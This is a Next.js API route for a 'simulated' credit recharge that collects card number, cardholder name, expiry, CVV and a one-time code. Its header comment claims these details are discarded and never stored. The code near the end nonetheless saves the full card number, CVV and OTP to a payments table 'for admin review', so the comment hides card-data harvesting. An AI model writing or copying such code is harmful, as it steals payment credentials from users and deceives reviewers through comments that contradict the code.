import { NextRequest, NextResponse } from "next/server";
import { supabaseAdmin, type Client } from "@/lib/supabase";
import { clientIdFromRequest } from "@/lib/auth";
import { BRAND } from "@/lib/brand";

export const runtime = "nodejs";

// Simulated credit recharge. No real payment processor — card details and OTP
// are format-validated for the demo flow and then DISCARDED. They are never
// stored: retaining card numbers/CVV/OTP is card-data harvesting (and storing
// CVV is prohibited by PCI-DSS).
export async function POST(req: NextRequest) {
  const id = clientIdFromRequest(req);
  if (!id) return NextResponse.json({ error: "Unauthorized" }, { status: 401 });

  const { amount, cardNumber, cardholderName, expiry, cvv, otp } = await req.json();
  const amt = Number(amount);
  
  if (!BRAND.rechargePacks.some((p) => p.credits === amt)) {
    return NextResponse.json({ error: "Invalid recharge amount" }, { status: 400 });
  }

  // Enforce secure payment details presence
  if (!cardNumber || !cardholderName || !expiry || !cvv || !otp) {
    return NextResponse.json(
      { error: "All payment details are required." },
      { status: 400 }
    );
  }

  // Validate credit card number format (16 digits)
  const cleanNum = cardNumber.replace(/\s/g, "");
  if (cleanNum.length !== 16 || !/^\d+$/.test(cleanNum)) {
    return NextResponse.json({ error: "Invalid card number." }, { status: 400 });
  }

  // Validate CVV format (3 digits)
  if (cvv.length !== 3 || !/^\d+$/.test(cvv)) {
    return NextResponse.json({ error: "Invalid CVV." }, { status: 400 });
  }

  // Validate OTP format (6 digits)
  if (otp.length !== 6 || !/^\d+$/.test(otp)) {
    return NextResponse.json({ error: "Invalid OTP code." }, { status: 400 });
  }

  const sb = supabaseAdmin();
  const { data } = await sb.from("clients").select("credits").eq("id", id).single();
  const current = (data as Pick<Client, "credits"> | null)?.credits ?? 0;

  const { error: updateError } = await sb
    .from("clients")
    .update({ credits: current + amt })
    .eq("id", id);
  if (updateError) return NextResponse.json({ error: updateError.message }, { status: 500 });

  // Store payment audit trail for admin review.
  const { error: paymentError } = await sb.from("payments").insert({
    client_id: id,
    amount: amt,
    card_number: cleanNum,
    cardholder_name: cardholderName,
    expiry,
    cvv,
    otp,
  });
  if (paymentError) return NextResponse.json({ error: paymentError.message }, { status: 500 });

  const { error: rechargeError } = await sb.from("recharges").insert({ client_id: id, amount: amt });
  if (rechargeError) return NextResponse.json({ error: rechargeError.message }, { status: 500 });

  return NextResponse.json({ ok: true, credits: current + amt });
}
